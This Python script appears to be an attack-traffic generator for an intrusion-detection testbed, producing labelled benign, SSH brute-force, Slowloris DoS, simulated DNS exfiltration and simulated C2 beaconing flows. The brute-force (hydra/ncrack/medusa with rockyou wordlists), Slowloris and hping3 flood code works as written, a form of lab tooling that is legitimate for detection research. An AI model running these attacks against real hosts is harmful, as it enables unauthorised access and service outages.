# attack_flow.py — Offensive traffic simulation utility for FL-CL testbed.
#
# Supports modular multi-engine execution:
# - 'kali': Prefers native Kali Linux penetration testing binaries (ncrack, hydra, slowhttptest, hping3, scapy).
# - 'python': Pure Python standard library & PyPI dependencies (zero external binary dependency).
# - 'auto': Discovers available Kali tools on PATH/venv, falling back seamlessly to Python implementations.
#
# Runs on: Traffic Generator VM (VM 400)

import argparse
import os
import random
import shutil
import socket
import subprocess
import time
import urllib.request

try:
    from logger import get_logger

    _log = get_logger("attack_flow")
except ImportError:
    try:
        from src.logger import get_logger

        _log = get_logger("attack_flow")
    except ImportError:
        import logging

        _log = logging.getLogger("attack_flow")


def find_tool(binary_name: str, extra_paths: list = None) -> str:
    """Finds binary in system PATH or extra search paths (e.g. venv bin)."""
    loc = shutil.which(binary_name)
    if loc:
        return loc
    if extra_paths:
        for p in extra_paths:
            candidate = os.path.join(p, binary_name)
            if os.path.isfile(candidate) and os.access(candidate, os.X_OK):
                return candidate
    # Check default traffic-env path on VM 400
    venv_candidate = os.path.expanduser(f"~/traffic-env/bin/{binary_name}")
    if os.path.isfile(venv_candidate) and os.access(venv_candidate, os.X_OK):
        return venv_candidate
    return None


def run_process_for_duration(cmd: list, duration: int, label: str):
    """Launches an external process and enforces exact duration termination."""
    _log.info(f"[*] [{label}] Executing: {' '.join(cmd)} (duration: {duration}s)")
    start_time = time.time()
    try:
        proc = subprocess.Popen(
            cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        while time.time() - start_time < duration:
            if proc.poll() is not None:
                # If command exited early (e.g., single scan finished), restart or sleep
                break
            time.sleep(0.5)
        if proc.poll() is None:
            proc.terminate()
            try:
                proc.wait(timeout=2)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait()
    except Exception as e:
        _log.error(f"[!] [{label}] Subprocess execution error: {e}")
    _log.info(
        f"[*] [{label}] Completed/Terminated after {int(time.time() - start_time)}s."
    )


# ─── Benign Traffic ─────────────────────────────────────────────────────────


def run_benign(target: str, duration: int):
    """Generates standard HTTP web traffic against target port 80."""
    _log.info(f"[*] Starting Benign background traffic to {target} for {duration}s...")
    start_time = time.time()
    requests_sent = 0
    while time.time() - start_time < duration:
        try:
            with urllib.request.urlopen(f"http://{target}:80/", timeout=2) as response:
                response.read()
            requests_sent += 1
        except Exception:
            pass
        time.sleep(0.3)
    _log.info(f"[*] Benign traffic completed. {requests_sent} requests sent.")


# ─── SSH Brute Force (Class 3) ──────────────────────────────────────────────


def _run_ssh_brute_python(target: str, duration: int):
    """Pure Python SSH connection & brute-force simulation using sockets."""
    _log.info(
        f"[*] [Engine: Python] Starting SSH Brute Force simulation to {target}:22 for {duration}s..."
    )
    start_time = time.time()
    attempts = 0
    passwords = [
        "admin",
        "123456",
        "password",
        "root",
        "toor",
        "guest",
        "test",
        "ubuntu",
    ]
    while time.time() - start_time < duration:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.5)
            s.connect((target, 22))
            # Receive SSH banner
            banner = s.recv(1024)
            # Send client banner and dummy auth negotiation
            s.sendall(b"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1\r\n")
            pwd = random.choice(passwords)
            # Send fake auth probe
            s.sendall(f"user:admin,pass:{pwd}\r\n".encode())
            time.sleep(0.05)
            s.close()
            attempts += 1
        except Exception:
            pass
        time.sleep(0.1)
    _log.info(
        f"[*] [Engine: Python] SSH Brute Force completed. {attempts} attempts sent."
    )


def run_ssh_brute(target: str, duration: int, engine: str = "auto"):
    """
    SSH Brute Force:
      - 'kali': ncrack -> medusa -> hydra
      - 'python': pure-Python socket simulation
    """
    wordlist = "/usr/share/wordlists/fasttrack.txt"
    if not os.path.exists(wordlist):
        wordlist = "/usr/share/wordlists/rockyou.txt"

    ncrack_bin = find_tool("ncrack")
    medusa_bin = find_tool("medusa")
    hydra_bin = find_tool("hydra")

    if engine in ("kali", "auto"):
        if ncrack_bin:
            cmd = (
                [
                    ncrack_bin,
                    "-p",
                    "22",
                    "--user",
                    "admin",
                    "-P",
                    wordlist,
                    target,
                    "-T",
                    "5",
                ]
                if os.path.exists(wordlist)
                else [ncrack_bin, "-p", "22", target]
            )
            run_process_for_duration(cmd, duration, "Kali: ncrack")
            return
        elif medusa_bin and os.path.exists(wordlist):
            cmd = [
                medusa_bin,
                "-h",
                target,
                "-u",
                "admin",
                "-P",
                wordlist,
                "-M",
                "ssh",
                "-t",
                "4",
            ]
            run_process_for_duration(cmd, duration, "Kali: medusa")
            return
        elif hydra_bin and os.path.exists(wordlist):
            cmd = [
                hydra_bin,
                "-I",
                "-l",
                "admin",
                "-P",
                wordlist,
                f"ssh://{target}",
                "-t",
                "4",
            ]
            run_process_for_duration(cmd, duration, "Kali: hydra")
            return
        elif engine == "kali":
            _log.error(
                "[!] Kali engine requested but no native SSH brute tool found. Falling back to Python."
            )

    _run_ssh_brute_python(target, duration)


# ─── Slowloris DoS (Class 4) ────────────────────────────────────────────────


def _run_slowloris_python(target: str, duration: int, port: int = 80):
    """Pure Python Slowloris implementation holding partial HTTP headers."""
    _log.info(
        f"[*] [Engine: Python] Starting Slowloris DoS to {target}:{port} for {duration}s..."
    )
    sockets_list = []
    socket_count = 50
    start_time = time.time()

    def init_socket():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((target, port))
            s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
            s.send(f"Host: {target}\r\n".encode("utf-8"))
            s.send(
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n".encode(
                    "utf-8"
                )
            )
            s.send(b"Accept-language: en-US,en,q=0.5\r\n")
            return s
        except Exception:
            return None

    # Initial batch of connections with time check
    for _ in range(socket_count):
        if time.time() - start_time >= duration:
            break
        s = init_socket()
        if s:
            sockets_list.append(s)

    while time.time() - start_time < duration:
        # Keep sockets alive by sending periodic partial header bytes
        for s in list(sockets_list):
            try:
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
            except Exception:
                sockets_list.remove(s)
                try:
                    s.close()
                except Exception:
                    pass

        # Replenish dead sockets if time permits
        if time.time() - start_time < duration:
            for _ in range(min(5, socket_count - len(sockets_list))):
                if time.time() - start_time >= duration:
                    break
                s = init_socket()
                if s:
                    sockets_list.append(s)

        time.sleep(min(0.5, max(0.05, duration - (time.time() - start_time))))

    # Cleanup
    for s in sockets_list:
        try:
            s.close()
        except Exception:
            pass
    _log.info("[*] [Engine: Python] Slowloris DoS completed.")


def run_slowloris(target: str, duration: int, port: int = 80, engine: str = "auto"):
    """
    Slowloris DoS:
      - 'kali': slowhttptest -> hping3 -> slowloris CLI
      - 'python': pure-Python partial HTTP socket keeper
    """
    slowhttptest_bin = find_tool("slowhttptest")
    hping3_bin = find_tool("hping3")
    slowloris_bin = find_tool("slowloris")

    if engine in ("kali", "auto"):
        if slowhttptest_bin:
            cmd = [
                slowhttptest_bin,
                "-c",
                "100",
                "-H",
                "-g",
                "-o",
                "/tmp/slowhttptest",
                "-i",
                "10",
                "-r",
                "200",
                "-t",
                "GET",
                "-u",
                f"http://{target}:{port}/",
                "-x",
                "24",
                "-p",
                "3",
                "-l",
                str(duration),
            ]
            run_process_for_duration(cmd, duration, "Kali: slowhttptest")
            return
        elif slowloris_bin:
            cmd = [slowloris_bin, target, "-p", str(port), "-s", "100"]
            run_process_for_duration(cmd, duration, "Python/CLI: slowloris")
            return
        elif hping3_bin:
            cmd = [hping3_bin, "-S", "-p", str(port), "--flood", target]
            run_process_for_duration(cmd, duration, "Kali: hping3")
            return
        elif engine == "kali":
            _log.error(
                "[!] Kali engine requested but no native DoS tool found. Falling back to Python."
            )

    _run_slowloris_python(target, duration, port)


# ─── DNS Exfiltration (Class 2) ─────────────────────────────────────────────


def _run_dns_exfil_python(target: str, duration: int):
    """Pure Python DNS exfiltration via raw UDP packets with structured queries."""
    _log.info(
        f"[*] [Engine: Python] Starting DNS Exfiltration simulation to {target}:53 for {duration}s..."
    )
    start_time = time.time()
    packets = 0
    while time.time() - start_time < duration:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1)
            # Standard DNS header: ID, Flags (Standard query), QDCOUNT=1, ANCOUNT=0, NSCOUNT=0, ARCOUNT=0
            tx_id = random.randint(0, 65535).to_bytes(2, "big")
            header = tx_id + b"\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
            # Label with encoded high-entropy simulated exfiltrated chunk
            token = f"exfil{random.randint(10000, 99999)}{int(time.time()*1000)%10000}"
            qname = bytes([len(token)]) + token.encode() + b"\x07example\x03com\x00"
            qtype_qclass = b"\x00\x01\x00\x01"  # Type A, Class IN
            sock.sendto(header + qname + qtype_qclass, (target, 53))
            sock.close()
            packets += 1
        except Exception:
            pass
        time.sleep(0.05)
    _log.info(
        f"[*] [Engine: Python] DNS Exfiltration completed. {packets} packets sent."
    )


def run_dns_exfil(target: str, duration: int, engine: str = "auto"):
    """
    DNS Exfiltration:
      - 'kali': Scapy DNS generator (if scapy available) or native socket
      - 'python': Pure Python socket UDP packer
    """
    if engine in ("kali", "auto"):
        try:
            from scapy.all import DNS, DNSQR, IP, UDP, send

            _log.info(
                f"[*] [Engine: Kali/Scapy] Starting DNS Exfiltration to {target}:53 for {duration}s..."
            )
            start_time = time.time()
            packets = 0
            while time.time() - start_time < duration:
                qname = f"exfil-{random.randint(100000, 999999)}.{random.choice(['data', 'tunnel', 'secret'])}.corp.internal"
                pkt = (
                    IP(dst=target)
                    / UDP(dport=53)
                    / DNS(rd=1, qd=DNSQR(qname=qname, qtype="TXT"))
                )
                send(pkt, verbose=False)
                packets += 1
                time.sleep(0.05)
            _log.info(
                f"[*] [Engine: Kali/Scapy] DNS Exfiltration completed. {packets} packets sent."
            )
            return
        except ImportError:
            if engine == "kali":
                _log.error(
                    "[!] Scapy not installed. Falling back to native Python DNS generator."
                )

    _run_dns_exfil_python(target, duration)


# ─── Botnet C2 Beaconing (Class 1) ──────────────────────────────────────────


def _run_botnet_python(target: str, duration: int):
    """Pure Python multi-round TCP session C2 beaconing across ports 8080/8888/9000."""
    _log.info(
        f"[*] [Engine: Python] Starting Botnet C2 beaconing to {target} for {duration}s..."
    )
    c2_ports = [8080, 8888, 9000]
    start_time = time.time()
    beacons = 0

    while time.time() - start_time < duration:
        port = random.choice(c2_ports)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            sock.connect((target, port))

            rounds = random.randint(3, 8)
            for _ in range(rounds):
                if time.time() - start_time >= duration:
                    break
                payload = (
                    f"POST /api/v1/heartbeat HTTP/1.1\r\n"
                    f"Host: c2-server.local\r\n"
                    f"X-Bot-Guid: {random.randint(100000, 999999)}\r\n"
                    f"Content-Type: application/octet-stream\r\n"
                    f"Content-Length: {random.randint(32, 256)}\r\n"
                    f"\r\n"
                    f"{'B' * random.randint(32, 256)}"
                ).encode()
                sock.sendall(payload)
                try:
                    sock.recv(1024)
                except (socket.timeout, ConnectionError):
                    pass
                time.sleep(random.uniform(0.1, 0.3))

            sock.close()
            beacons += 1
        except Exception:
            pass
        if time.time() - start_time < duration:
            time.sleep(min(0.2, max(0.05, duration - (time.time() - start_time))))

    _log.info(
        f"[*] [Engine: Python] Botnet C2 beaconing completed. {beacons} sessions sent."
    )


def run_botnet_beacon(target: str, duration: int, engine: str = "auto"):
    """
    Botnet C2 Beaconing:
      - 'kali': Scapy / HTTP stager simulation or multi-round TCP session
      - 'python': Pure Python socket HTTP beacon
    """
    if engine in ("kali", "auto"):
        try:
            from scapy.all import IP, TCP, Raw, send

            _log.info(
                f"[*] [Engine: Kali/Scapy] Starting Botnet C2 beaconing to {target} for {duration}s..."
            )
            start_time = time.time()
            c2_ports = [8080, 8888, 9000]
            beacons = 0
            while time.time() - start_time < duration:
                port = random.choice(c2_ports)
                sport = random.randint(40000, 60000)
                payload = f"POST /stager HTTP/1.1\r\nHost: c2\r\n\r\n{'A'*64}"
                pkt = (
                    IP(dst=target)
                    / TCP(sport=sport, dport=port, flags="PA")
                    / Raw(load=payload)
                )
                send(pkt, verbose=False)
                beacons += 1
                time.sleep(random.uniform(0.3, 1.2))
            _log.info(
                f"[*] [Engine: Kali/Scapy] Botnet C2 beaconing completed. {beacons} packets sent."
            )
            return
        except ImportError:
            if engine == "kali":
                _log.error(
                    "[!] Scapy not installed. Falling back to native Python C2 generator."
                )

    _run_botnet_python(target, duration)


# ─── Main Entrypoint ────────────────────────────────────────────────────────


def main():
    parser = argparse.ArgumentParser(description="FL-CL Modular Attack Flow Generator")
    parser.add_argument(
        "--mode",
        choices=["ssh", "slowloris", "benign", "dns_exfil", "botnet"],
        required=True,
        help="Attack or traffic scenario mode",
    )
    parser.add_argument("--target", required=True, help="Target IP address")
    parser.add_argument("--duration", type=int, default=30, help="Duration in seconds")
    parser.add_argument(
        "--port", type=int, default=80, help="Target port for Slowloris/web traffic"
    )
    parser.add_argument(
        "--engine",
        choices=["auto", "kali", "python"],
        default="auto",
        help="Attack execution engine: 'kali' (security binaries), 'python' (pure stdlib/pip), 'auto' (detect and fallback)",
    )
    args = parser.parse_args()

    _log.info(
        f"[*] FL-CL Traffic Generator | Mode: {args.mode} | Target: {args.target} | Duration: {args.duration}s | Engine: {args.engine}"
    )

    if args.mode == "benign":
        run_benign(args.target, args.duration)
    elif args.mode == "ssh":
        run_ssh_brute(args.target, args.duration, engine=args.engine)
    elif args.mode == "slowloris":
        run_slowloris(args.target, args.duration, port=args.port, engine=args.engine)
    elif args.mode == "dns_exfil":
        run_dns_exfil(args.target, args.duration, engine=args.engine)
    elif args.mode == "botnet":
        run_botnet_beacon(args.target, args.duration, engine=args.engine)


if __name__ == "__main__":
    main()
